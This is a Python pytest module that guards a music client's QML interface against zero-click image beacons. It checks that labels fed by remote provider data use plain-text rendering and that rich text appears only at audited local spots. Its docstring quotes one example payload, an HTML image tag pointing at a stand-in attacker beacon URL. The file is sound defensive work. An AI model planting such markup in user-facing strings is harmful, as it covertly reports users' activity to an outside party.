"""A zero-click image-beacon must never re-appear in the QML.

THE THREAT
----------
Qt's ``Text``/``Label`` default to ``textFormat: Text.AutoText``. AutoText
sniffs the bound string and, if it looks like HTML, parses it as rich text, at
which point an embedded ``<img src="https://attacker/beacon?id=...">`` is
fetched the instant the label paints. For a string an attacker controls
(anything TIDAL serves us: album/track/artist names, bios, durations,
playlist titles, queue labels) that is a zero-click outbound beacon leaking
"this user viewed this item". ``StyledText`` and ``RichText`` parse HTML the
same way; only ``PlainText`` is safe.

THE POLICY (structural, no remote-vs-local guessing)
----------------------------------------------------
- every dynamic ``text:`` expression in a provider-data file must be
  ``PlainText`` or a marked rich-text exception below;
- the StyledText/RichText set must equal exactly those exceptions;
- Text-derived components must pin PlainText, and instances may not re-enable
  rich text;
- marker/allowlist drift fails.

The scanner these tests read QML with lives in ``tests/support/qml_text.py``
(unit-tested in ``tests/ui/test_qml_text_scan.py``); this file owns the policy
and the exceptions. The check is source-level on purpose: no runtime scenario
can enumerate every dynamic ``text:`` binding, so the structural scan is what
makes a new binding anywhere fail without a list edit.
"""

from __future__ import annotations

import re

from support.paths import QML_DIR
from support.qml_text import (
    DELIBERATE_MARKER,
    brace_span,
    find_own_prop_value,
    find_own_text_value,
    find_text_derived_components,
    is_literal_only,
    iter_component_opens,
    iter_text_elements,
    strip_string_literals,
)

# Files in scope: every `.qml` under the directory tree, except the LOCAL_ONLY
# set below. A new component with a dynamic remote text binding fails the
# guard with no list edit. Paths are relative to the QML directory, so a
# future subdirectory file is covered by construction.
#
#   SettingsPage.qml renders only LOCAL data: the app's own settings schema
#   (labels/groups/descriptions defined in our Python) and our own
#   ffmpeg/updater status. It is still scanned, so its deliberate StyledText
#   spots stay deliberate and cannot quietly start binding a TIDAL string.
LOCAL_ONLY_FILES = {"domains/settings/SettingsPage.qml"}
FILES = sorted(p.relative_to(QML_DIR).as_posix() for p in QML_DIR.rglob("*.qml"))
TIDAL_DATA_FILES = set(FILES) - LOCAL_ONLY_FILES

# Remote markers: substrings that, inside a `text:` binding in a provider-data
# file, mean the rendered string is (or may be) attacker-controllable. Dotted
# field access on a remote root is matched so a field we never enumerated
# (a future `model.someNewBlurb`) is caught too; the bare `modelData` forms
# appear only for local inline-literal arrays and would render `[object
# Object]` for a real TIDAL row.
REMOTE_MARKERS = (
    re.compile(r"\bmodel\.[A-Za-z_]"),
    re.compile(r"\bmodelData\.[A-Za-z_]"),
    re.compile(r"\bartistData\.[A-Za-z_]"),
    re.compile(r"\bdb\.label\b"),
    # Component-indirection blind spot: AlbumBlock / TrackRow / ArtistLinks
    # receive remote TIDAL data through BARE-named required properties and
    # render the bare name. The lookbehind keeps `model.title` and a dotted
    # local `.title` from double-matching. NOTE: add any NEW bare
    # remote-bearing component property to this list.
    re.compile(r"(?<![.\w])title\b"),
    re.compile(r"(?<![.\w])artistName\b"),
    re.compile(r"(?<![.\w])album\b"),
    re.compile(r"\bal\.suffix\b"),  # ArtistLinks suffix: fed `album` (remote) by TrackRow
)

SAFE_PLAINTEXT = "textFormat: Text.PlainText"

# Deliberate rich-text elements (StyledText/RichText ON PURPOSE: links/markup),
# keyed by (file, marker slug). Each carries an in-source marker comment
# `// guard:deliberate-richtext <slug>` on (or immediately above) its open
# line, so the anchor survives edits that shift line numbers. Each binds only
# LOCAL data (our bundled ffmpeg source list / updater repo / a string
# literal), never TIDAL. There are NO allowlisted TIDAL spots: every TIDAL
# string is PlainText.
DELIBERATE_RICHTEXT: set[tuple[str, str]] = {
    ("Main.qml", "ffmpeg-attribution"),  # FFmpeg source attribution link (appFfmpeg.status.*)
    ("Main.qml", "privacy-promise"),  # privacy-promise blurb (string literal w/ <font>)
    ("Main.qml", "download-nudge-body"),  # download-folder nudge body (string literal, <font>/<tt> code path)
    ("domains/settings/SettingsPage.qml", "ffmpeg-attribution"),  # FFmpeg attribution link (page.ff.status.*)
    ("domains/settings/SettingsPage.qml", "ffmpeg-attribution-managed"),  # same link, managed twin-tile layout
    (
        "domains/settings/SettingsPage.qml",
        "updater-releases-link",
    ),  # updater "Releases & changelog" link (page.appUp.*)
}


def _matches_remote(text_value: str) -> bool:
    code = strip_string_literals(text_value)
    return any(p.search(code) for p in REMOTE_MARKERS)


def _derived_text_components() -> dict[str, tuple[str, int]]:
    """Every `component X: Text` (or Text-rooted file) in the tree:
    name -> (file, brace index)."""
    found: dict[str, tuple[str, int]] = {}
    for fname in FILES:
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        for name, open_idx in find_text_derived_components(src, fname).items():
            found[name] = (fname, open_idx)
    return found


def test_a_text_derived_component_pins_plaintext():
    """Bake PlainText in, so every instance is safe by construction whatever
    it is later fed."""
    derived = _derived_text_components()
    assert derived, "the scanner found no `component X: Text`; has the spelling changed?"

    violations: list[str] = []
    for name, (fname, open_idx) in derived.items():
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        body = src[open_idx : brace_span(src, open_idx) + 1]
        code = re.sub(r"//[^\n]*", "", body)
        code = re.sub(r"/\*.*?\*/", "", code, flags=re.DOTALL)
        if SAFE_PLAINTEXT not in code:
            violations.append(f"{fname}: component {name} derives from Text without pinning {SAFE_PLAINTEXT!r}")
        elif "Text.StyledText" in code or "Text.RichText" in code or "Text.AutoText" in code:
            violations.append(f"{fname}: component {name} also assigns a rich-text format")

    assert not violations, "Text-derived component(s) not pinned to plain text:\n" + "\n".join(violations)


def test_a_text_derived_instance_does_not_reenable_richtext():
    """And the instance half: an instantiation can re-declare textFormat and
    undo what the component pinned."""
    derived = _derived_text_components()
    violations: list[str] = []
    for name, (decl_file, decl_idx) in derived.items():
        for fname in FILES:
            src = (QML_DIR / fname).read_text(encoding="utf-8")
            for line_no, open_idx in iter_component_opens(src, name):
                if fname == decl_file and open_idx == decl_idx:
                    continue  # the declaration itself, covered by the test above
                span = src[open_idx : brace_span(src, open_idx) + 1]
                tf = find_own_prop_value(span, "textFormat")
                if tf is not None and tf.strip() != "Text.PlainText":
                    violations.append(
                        f"{fname}:{line_no}: {name} overrides textFormat to {tf.strip()!r}: "
                        "re-enables rich text (auto-<img>) on whatever it is fed"
                    )

    assert not violations, "Text-derived instance(s) re-enabling rich text:\n" + "\n".join(violations)


def test_dynamic_text_is_plaintext():
    """STRUCTURAL guard (the real anti-regression rule). In every scanned
    provider-data file, EVERY Text/Label whose ``text:`` is dynamic must
    render as PlainText or be an audited rich-text spot. No remote-vs-local
    guessing: any dynamic string, however it reaches ``text:`` (``model.x``, a
    bare component prop, bracket access, a local alias, a multi-line JS
    block), is forced off the rich-text-capable AutoText default. Pure
    literals are exempt: they can never carry a remote string.
    """
    violations: list[str] = []
    audited = 0
    for fname in sorted(TIDAL_DATA_FILES):
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        for element in iter_text_elements(src):
            tv = find_own_text_value(element.span)
            if tv is None or is_literal_only(tv):
                continue  # no own text:, or a pure literal: safe
            audited += 1
            if SAFE_PLAINTEXT in element.span:
                continue
            if element.marker is not None and (fname, element.marker) in DELIBERATE_RICHTEXT:
                continue  # intentional rich text, governed by the backstop test
            note = " (binds a remote marker!)" if _matches_remote(tv) else ""
            violations.append(
                f"{fname}:{element.line}: dynamic {element.kind} is not textFormat: "
                f"Text.PlainText (and not an audited rich-text spot)"
                f"{note}\n        text value: {tv.strip()[:80]!r}"
            )

    # Vacuous-pass tripwire: Main.qml binds dozens of dynamic labels; if this
    # collapses the scanner silently broke and would never catch a regression.
    assert audited >= 30, (
        f"only found {audited} dynamic Text/Label elements in the scanned files; the scanner is probably broken."
    )
    assert not violations, (
        "Dynamic strings rendered on the rich-text-capable AutoText default: a "
        "zero-click image-beacon could regress through any of these. Add "
        "`textFormat: Text.PlainText` (or, for deliberate links, StyledText + "
        "a DELIBERATE_RICHTEXT entry):\n\n" + "\n".join(violations)
    )


def test_richtext_is_only_the_deliberate_local_spots():
    """Backstop on the OTHER rich-text paths. Both StyledText AND RichText parse
    HTML and auto-fetch `<img>`/`<a>`, so the set of StyledText/RichText
    elements must equal exactly the audited DELIBERATE_RICHTEXT spots, and none
    may bind a remote marker."""
    found: set[tuple[str, str]] = set()
    unmarked: list[str] = []
    leaked_remote: list[str] = []
    for fname in FILES:
        is_tidal = fname in TIDAL_DATA_FILES
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        for element in iter_text_elements(src):
            if "textFormat: Text.StyledText" not in element.span and "textFormat: Text.RichText" not in element.span:
                continue
            if element.marker is None:
                unmarked.append(f"{fname}:{element.line}")
            else:
                found.add((fname, element.marker))
            tv = find_own_text_value(element.span) or ""
            if is_tidal and _matches_remote(tv):
                leaked_remote.append(
                    f"{fname}:{element.line}: a StyledText/RichText now binds a remote marker: "
                    f"rich text on attacker data!\n        text value: {tv.strip()[:80]!r}"
                )

    unexpected = sorted(found - DELIBERATE_RICHTEXT) + [f"{loc} (no marker)" for loc in unmarked]
    missing = DELIBERATE_RICHTEXT - found
    assert not unexpected, (
        "StyledText/RichText element(s) outside the audited allowlist. They parse "
        "HTML (auto-fetch <img>/<a>). Confirm the source is LOCAL, add a\n"
        "`// guard:deliberate-richtext <slug>` marker on the element's open line, "
        "and list (file, slug) in DELIBERATE_RICHTEXT, or switch to "
        "PlainText:\n  " + "\n  ".join(str(u) for u in unexpected)
    )
    assert not missing, (
        "DELIBERATE_RICHTEXT references marker slugs with no matching "
        "StyledText/RichText element (marker removed, or element no longer rich "
        "text; re-point or remove): " + ", ".join(f"{f}#{s}" for f, s in sorted(missing))
    )
    assert not leaked_remote, "\n".join(leaked_remote)


def test_allowlist_still_points_at_elements():
    """Anti-rot on the markers themselves: every allowlisted (file, slug) must
    be carried by exactly ONE Text/Label element, and every marker comment in
    the source must be attached to an element and listed."""
    problems: list[str] = []
    for fname in FILES:
        src = (QML_DIR / fname).read_text(encoding="utf-8")
        attached = [e.marker for e in iter_text_elements(src) if e.marker is not None]
        # Markers appearing anywhere in the file, attached or not.
        all_markers = DELIBERATE_MARKER.findall(src)
        problems.extend(
            f"{fname}#{slug}: marker in source but not in DELIBERATE_RICHTEXT"
            for slug in all_markers
            if (fname, slug) not in DELIBERATE_RICHTEXT
        )
        if len(all_markers) != len(set(all_markers)):
            problems.append(f"{fname}: duplicate marker slug(s): each must be unique per file")
        orphans = set(all_markers) - set(attached)
        problems.extend(
            f"{fname}#{slug}: marker is not on (or directly above) a Text/Label open" for slug in sorted(orphans)
        )
    assert not problems, "Marker/allowlist drift:\n" + "\n".join(problems)
